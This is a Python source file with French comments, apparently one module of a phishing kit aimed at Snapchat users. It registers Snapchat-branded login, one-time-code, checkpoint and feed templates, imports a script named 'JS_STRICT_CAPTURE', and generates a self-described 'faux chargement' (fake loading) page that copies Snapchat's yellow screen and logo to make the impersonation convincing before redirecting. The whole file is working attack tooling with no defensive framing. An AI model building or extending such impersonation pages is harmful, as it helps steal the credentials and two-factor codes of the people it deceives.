"""route.py — Routes et templates spécifiques à Snapchat.

Contient :
  • TEMPLATES : dict des templates HTML (login, OTP, checkpoint, feed)
  • get_template(key) : retourne un template par sa clé
  • handle_loading(cfg) : génère la page de faux chargement Snapchat
  • register_routes(app) : enregistre les routes spécifiques (none pour Snapchat)
"""

from platforms._shared import JS_STRICT_CAPTURE, SC_LOGO_SVG
from platforms.snapchat.login import HTML_MOBILE_LOGIN
from platforms.snapchat.otp import HTML_OTP_MOBILE
from platforms.snapchat.checkpoint import HTML_CHECKPOINT
from platforms.snapchat.feed import HTML_FEED


# ════════════════════════════════════════════════════════════════════
#  Dictionnaire des templates Snapchat
# ════════════════════════════════════════════════════════════════════
TEMPLATES = {
    "mobile_login": HTML_MOBILE_LOGIN,
    "mobile_otp":   HTML_OTP_MOBILE,
    "checkpoint":   HTML_CHECKPOINT,
    "feed":         HTML_FEED,
    # Snapchat est mobile-only : pas de pc_login ni pc_otp
}


def get_template(key):
    """Retourne le template demandé, ou None si non trouvé."""
    try:
        return TEMPLATES.get(key)
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("snapchat.route.get_template", e)
        except Exception:
            pass
        return None


def handle_loading(cfg):
    """Génère la page de faux chargement Snapchat.
    Affiche le logo Snapchat (fond jaune #fffc00) pendant la durée configurée,
    puis redirige vers /feed.

    Retourne le HTML de la page de chargement, ou None si non applicable.
    """
    try:
        # Durée (secondes) — défaut 3
        try:
            duration = int(cfg.get("fake_loading_duration", 3))
            if duration < 1:
                duration = 3
        except (ValueError, TypeError):
            duration = 3

        # Logo Snapchat (taille 120x120)
        logo_svg = SC_LOGO_SVG.replace('width="56" height="56"', 'width="120" height="120"')

        # Construire la page HTML
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="refresh" content="{duration};url=/feed">
    <title>Chargement...</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html, body {{
            height: 100%; width: 100%;
            background: #fffc00;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }}
        .loading-container {{
            position: fixed; inset: 0;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }}
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="logo-wrapper">{logo_svg}</div>
    </div>
    <script>
        try {{
            setTimeout(function() {{ window.location.href = '/feed'; }}, {duration * 1000});
        }} catch(e) {{ window.location.href = '/feed'; }}
    </script>
</body>
</html>'''
        return html
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("snapchat.route.handle_loading", e)
        except Exception:
            pass
        return None


def register_routes(app):
    """Enregistre les routes spécifiques à Snapchat.
    Snapchat n'a pas de routes dédiées — le /loading est géré par routes.py
    qui appelle handle_loading() ci-dessus."""
    pass
